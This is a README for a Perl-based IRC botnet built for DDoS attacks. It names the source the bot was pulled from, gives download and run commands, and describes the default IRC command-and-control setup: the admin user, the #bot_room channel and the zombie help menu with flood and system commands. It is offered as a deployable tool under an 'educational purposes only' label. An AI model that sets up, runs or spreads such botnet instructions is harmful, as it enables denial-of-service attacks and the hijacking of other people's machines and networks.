# IRC Botnet
Perl based DDoS IRC botnet, intially pulled from: http://202.202.121.27/bot.txt. Work in progress to serve for educational purposes only. 
### Running
This bot only requires perl to run; and an IRC server as a C&C server.

Download and extract the [latest perl file](https://github.com/joemccann/ircbot/bot.pl).
```sh
$ perl bot.pl 192.168.0.1
```
### C&C

Ensure you have an IRC server running on port 6667 (default setting), and login as user admin (default setting) and channel #bot_room (default setting). Initiate the help command: `!u @help`
> 
```
<@admin> !u @help
<zombie>  [Help] ======================= 
<zombie>  [Help] w0rmer PerlBot Main Help:  
<zombie>  [Help] ======================= 
<zombie>  [Help] !u @system              
<zombie>  [Help] !u @version             
<zombie>  [Help] !u @channel             
<zombie>  [Help] !u @flood               
<zombie>  [Help] !u @utils               
<zombie>  [Help] ======================= 
```
